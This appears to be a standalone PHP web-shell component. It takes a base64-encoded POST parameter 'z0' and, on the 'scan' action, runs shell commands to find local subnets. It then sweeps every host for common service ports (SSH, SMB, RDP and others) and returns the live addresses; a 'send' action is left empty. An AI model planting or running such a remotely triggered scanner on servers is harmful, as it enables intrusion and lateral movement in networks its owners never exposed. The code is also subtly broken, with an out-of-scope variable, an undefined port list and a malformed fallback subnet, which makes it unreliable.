<?php

$win = (FALSE !== strpos(strtolower(PHP_OS), 'win'));

function get_all_subnets() : array {
    $subnets = [];

    if ($win) {
        $output = shell_exec('ipconfig');
        if (preg_match_all('/IPv4 Address[\s\.:]+([0-9\.]+)/', $output, $matches)) {
            foreach ($matches[1] as $ip) {
                if ($ip !== '127.0.0.1') {
                    $parts = explode('.', $ip);
                    array_pop($parts);
                    $subnets[] = implode('.', $parts);
                }
            }
        }
    } else {
        $output = shell_exec("ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}'");
        if ($output) {
            $ips = explode("\n", trim($output));
            foreach ($ips as $ip) {
                $ip = trim($ip);
                if (!empty($ip) && $ip !== '127.0.0.1') {
                    $parts = explode('.', $ip);
                    array_pop($parts);
                    $subnets[] = implode('.', $parts);
                }
            }
        }
    }

    if (empty($subnets)) {
        $subnets[] = '192.168.1.1';
    }

    return array_unique($subnets);
}

function scan_LAN() : array {
    $subnets = get_all_subnets();
    $ports = [21, 22, 23, 80, 443, 445, 3389];
    $sockets = [];
    $live_hosts = [];
    $timeout = 1.0;

    foreach ($subnets as $subnet) {
        for ($i = 1; $i <= 254; $i++) {
            $ip = $subnet . '.' . $i;
            
            foreach ($ports_to_check as $port) {
                // open an asynchronous stream socket connection
                $context = stream_context_create();
                $sock = @stream_socket_client(
                    "tcp://{$ip}:{$port}", 
                    $errno, 
                    $errstr, 
                    $timeout, 
                    STREAM_CLIENT_CONNECT | STREAM_CLIENT_ASYNC_CONNECT, 
                    $context
                );
                
                if ($sock) {
                    // Track socket metadata to reference the host later
                    $sockets[(int)$sock] = [
                        'stream' => $sock,
                        'ip'     => $ip
                    ];
                }
            }
        }
    }

    $write = [];
    foreach ($sockets as $s) {
        $write[] = $s['stream'];
    }

    $read = null;
    $except = null;
    
    if (count($write) > 0 && stream_select($read, $write, $except, 1, 500000) > 0) {
        foreach ($write as $connected_stream) {
            $id = (int)$connected_stream;
            if (isset($sockets[$id])) {
                $live_hosts[] = $sockets[$id]['ip'];
            }
        }
    }

    // Clean up open socket handles
    foreach ($sockets as $s) {
        @fclose($s['stream']);
    }

    // Return unique, sorted list of discovered live IPs
    return array_values(array_unique($live_hosts));
}

$action = base64_decode($_POST['z0']);

switch ($action) {
    case 'scan':
        $machines = scan_LAN();
        echo json_encode($machines);
        break;

    case 'send':

        break;
}

?>